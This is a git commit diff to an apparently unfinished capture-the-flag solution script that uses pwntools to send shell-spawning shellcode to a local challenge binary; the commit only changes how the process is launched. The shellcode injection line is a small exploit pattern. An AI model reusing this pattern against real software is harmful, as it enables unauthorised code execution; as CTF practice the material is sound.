76e4319341a2001b8139d4c5a7e97e8070248576
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:22:36 -0400

    Update 07.py

--- chall_07/07.py
+++ chall_07/07.py
@@ -1,6 +1,6 @@
 from pwn import *
 binary = context.binary = ELF('./chall_07')
-p = process('./chall_07')
+p = process(binary.path)
 p.sendline(asm(shellcraft.sh()))
 p.interactive()
 # NOT FINISHED
